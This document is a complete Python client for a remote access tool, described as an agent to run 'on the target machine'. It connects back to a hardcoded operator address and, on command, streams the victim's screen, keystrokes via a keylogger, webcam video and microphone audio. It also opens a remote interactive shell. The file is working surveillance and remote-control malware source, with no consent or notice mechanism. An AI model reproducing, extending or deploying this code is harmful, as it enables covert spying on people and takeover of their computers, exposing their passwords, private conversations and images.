"""
client.py - Remote Administration Agent
Connects to the operator server and streams data on demand.
Run this on the target machine.
"""

import socket
import threading
import struct
import time
import io
import json
import sys
import platform

# ─── HARDCODED CONNECTION SETTINGS ───────────────────────────────────────────
HOST = "127.0.0.1"   # <-- Change to operator's IP address
PORT = 9999
# ─────────────────────────────────────────────────────────────────────────────

# Optional imports — features degrade gracefully if libs are missing
try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    import pyaudio
    HAS_PYAUDIO = True
except ImportError:
    HAS_PYAUDIO = False

try:
    from pynput import keyboard as pynput_keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False


# ─── PROTOCOL CONSTANTS ──────────────────────────────────────────────────────
CMD_START_SCREEN   = b'\x01'
CMD_STOP_SCREEN    = b'\x02'
CMD_START_KEYLOG   = b'\x03'
CMD_STOP_KEYLOG    = b'\x04'
CMD_SHELL_INPUT    = b'\x05'
CMD_START_CAM      = b'\x06'
CMD_STOP_CAM       = b'\x07'
CMD_START_AUDIO    = b'\x08'
CMD_STOP_AUDIO     = b'\x09'
CMD_SHELL_OUTPUT   = b'\x0A'
CMD_SCREEN_FRAME   = b'\x0B'
CMD_KEY_EVENT      = b'\x0C'
CMD_CAM_FRAME      = b'\x0D'
CMD_AUDIO_CHUNK    = b'\x0E'
CMD_PING           = b'\x0F'
CMD_PONG           = b'\x10'
CMD_INFO           = b'\x11'


def send_packet(sock, cmd, data=b''):
    """Send a length-prefixed packet: [1 byte cmd][4 byte len][data]"""
    length = struct.pack('>I', len(data))
    try:
        sock.sendall(cmd + length + data)
    except Exception:
        pass


def recv_packet(sock):
    """Receive a length-prefixed packet. Returns (cmd, data) or (None, None)."""
    try:
        header = _recv_exact(sock, 5)
        if not header:
            return None, None
        cmd = header[:1]
        length = struct.unpack('>I', header[1:])[0]
        data = _recv_exact(sock, length) if length else b''
        return cmd, data
    except Exception:
        return None, None


def _recv_exact(sock, n):
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


class ScreenCapture:
    """Captures the primary display and sends JPEG frames."""

    def __init__(self, sock, fps=10):
        self.sock = sock
        self.fps = fps
        self.running = False
        self.thread = None

    def start(self):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False

    def _loop(self):
        if not HAS_MSS or not HAS_PIL:
            send_packet(self.sock, CMD_SCREEN_FRAME, b'ERROR:missing mss/Pillow')
            return
        interval = 1.0 / self.fps
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # primary monitor
            while self.running:
                t0 = time.time()
                try:
                    img = sct.grab(monitor)
                    pil = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                    # Resize to 1280×720 max for bandwidth
                    pil.thumbnail((1280, 720), Image.LANCZOS)
                    buf = io.BytesIO()
                    pil.save(buf, format='JPEG', quality=60)
                    send_packet(self.sock, CMD_SCREEN_FRAME, buf.getvalue())
                except Exception as e:
                    pass
                elapsed = time.time() - t0
                time.sleep(max(0, interval - elapsed))


class KeylogCapture:
    """Captures keystrokes via pynput and sends them as JSON events."""

    def __init__(self, sock):
        self.sock = sock
        self.running = False
        self.listener = None

    def start(self):
        if self.running:
            return
        if not HAS_PYNPUT:
            send_packet(self.sock, CMD_KEY_EVENT, b'ERROR:missing pynput')
            return
        self.running = True
        self.listener = pynput_keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None

    def _on_press(self, key):
        if not self.running:
            return
        try:
            char = key.char if hasattr(key, 'char') and key.char else str(key)
        except Exception:
            char = str(key)
        event = json.dumps({"type": "press", "key": char, "ts": time.time()})
        send_packet(self.sock, CMD_KEY_EVENT, event.encode())

    def _on_release(self, key):
        if not self.running:
            return
        try:
            char = key.char if hasattr(key, 'char') and key.char else str(key)
        except Exception:
            char = str(key)
        event = json.dumps({"type": "release", "key": char, "ts": time.time()})
        send_packet(self.sock, CMD_KEY_EVENT, event.encode())


class WebcamCapture:
    """Captures webcam frames and sends them as JPEG."""

    def __init__(self, sock, fps=10):
        self.sock = sock
        self.fps = fps
        self.running = False
        self.thread = None

    def start(self):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False

    def _loop(self):
        if not HAS_CV2:
            send_packet(self.sock, CMD_CAM_FRAME, b'ERROR:missing opencv')
            return
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            send_packet(self.sock, CMD_CAM_FRAME, b'ERROR:no camera')
            return
        interval = 1.0 / self.fps
        while self.running:
            t0 = time.time()
            ret, frame = cap.read()
            if ret:
                frame = cv2.resize(frame, (640, 480))
                _, jpg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
                send_packet(self.sock, CMD_CAM_FRAME, jpg.tobytes())
            elapsed = time.time() - t0
            time.sleep(max(0, interval - elapsed))
        cap.release()


class AudioCapture:
    """Captures microphone audio and sends raw PCM chunks."""

    RATE = 16000
    CHUNK = 1024
    CHANNELS = 1
    FORMAT_CODE = 8  # pyaudio.paInt16

    def __init__(self, sock):
        self.sock = sock
        self.running = False
        self.thread = None

    def start(self):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False

    def _loop(self):
        if not HAS_PYAUDIO:
            send_packet(self.sock, CMD_AUDIO_CHUNK, b'ERROR:missing pyaudio')
            return
        pa = pyaudio.PyAudio()
        try:
            stream = pa.open(
                format=pyaudio.paInt16,
                channels=self.CHANNELS,
                rate=self.RATE,
                input=True,
                frames_per_buffer=self.CHUNK
            )
            while self.running:
                data = stream.read(self.CHUNK, exception_on_overflow=False)
                send_packet(self.sock, CMD_AUDIO_CHUNK, data)
            stream.stop_stream()
            stream.close()
        except Exception as e:
            send_packet(self.sock, CMD_AUDIO_CHUNK, f'ERROR:{e}'.encode())
        finally:
            pa.terminate()


class ShellSession:
    """Runs a subprocess shell and pipes I/O through the socket."""

    def __init__(self, sock):
        self.sock = sock
        self.proc = None
        self.thread = None

    def start(self):
        import subprocess
        shell = 'cmd.exe' if platform.system() == 'Windows' else '/bin/bash'
        try:
            self.proc = subprocess.Popen(
                shell,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=False,
                bufsize=0
            )
            self.thread = threading.Thread(target=self._read_output, daemon=True)
            self.thread.start()
        except Exception as e:
            send_packet(self.sock, CMD_SHELL_OUTPUT, f'ERROR:{e}\n'.encode())

    def write(self, data):
        if self.proc and self.proc.stdin:
            try:
                self.proc.stdin.write(data)
                self.proc.stdin.flush()
            except Exception:
                pass

    def stop(self):
        if self.proc:
            try:
                self.proc.terminate()
            except Exception:
                pass
            self.proc = None

    def _read_output(self):
        while self.proc:
            try:
                chunk = self.proc.stdout.read(512)
                if not chunk:
                    break
                send_packet(self.sock, CMD_SHELL_OUTPUT, chunk)
            except Exception:
                break
        send_packet(self.sock, CMD_SHELL_OUTPUT, b'\r\n[shell closed]\r\n')


class AgentClient:
    """Main agent: connects to operator and dispatches commands."""

    def __init__(self):
        self.sock = None
        self.screen = None
        self.keylog = None
        self.cam = None
        self.audio = None
        self.shell = None
        self.running = False

    def connect(self):
        while True:
            try:
                print(f"[*] Connecting to {HOST}:{PORT} ...")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                self.sock = s
                print(f"[+] Connected to operator.")
                self.running = True
                self._send_info()
                self._command_loop()
            except Exception as e:
                print(f"[-] Connection failed: {e}. Retrying in 5s...")
                time.sleep(5)
            finally:
                self.running = False
                self._stop_all()

    def _send_info(self):
        info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "machine": platform.machine(),
            "caps": {
                "screen": HAS_MSS and HAS_PIL,
                "keylog": HAS_PYNPUT,
                "cam": HAS_CV2,
                "audio": HAS_PYAUDIO,
                "shell": True
            }
        }
        send_packet(self.sock, CMD_INFO, json.dumps(info).encode())

    def _command_loop(self):
        while self.running:
            cmd, data = recv_packet(self.sock)
            if cmd is None:
                print("[-] Connection closed by operator.")
                break
            self._dispatch(cmd, data)

    def _dispatch(self, cmd, data):
        if cmd == CMD_PING:
            send_packet(self.sock, CMD_PONG)

        elif cmd == CMD_START_SCREEN:
            self.screen = ScreenCapture(self.sock)
            self.screen.start()

        elif cmd == CMD_STOP_SCREEN:
            if self.screen:
                self.screen.stop()
                self.screen = None

        elif cmd == CMD_START_KEYLOG:
            self.keylog = KeylogCapture(self.sock)
            self.keylog.start()

        elif cmd == CMD_STOP_KEYLOG:
            if self.keylog:
                self.keylog.stop()
                self.keylog = None

        elif cmd == CMD_START_CAM:
            self.cam = WebcamCapture(self.sock)
            self.cam.start()

        elif cmd == CMD_STOP_CAM:
            if self.cam:
                self.cam.stop()
                self.cam = None

        elif cmd == CMD_START_AUDIO:
            self.audio = AudioCapture(self.sock)
            self.audio.start()

        elif cmd == CMD_STOP_AUDIO:
            if self.audio:
                self.audio.stop()
                self.audio = None

        elif cmd == CMD_SHELL_INPUT:
            if not self.shell:
                self.shell = ShellSession(self.sock)
                self.shell.start()
            self.shell.write(data)

    def _stop_all(self):
        for obj in [self.screen, self.keylog, self.cam, self.audio, self.shell]:
            if obj:
                try:
                    obj.stop()
                except Exception:
                    pass
        self.screen = self.keylog = self.cam = self.audio = self.shell = None


if __name__ == '__main__':
    agent = AgentClient()
    agent.connect()
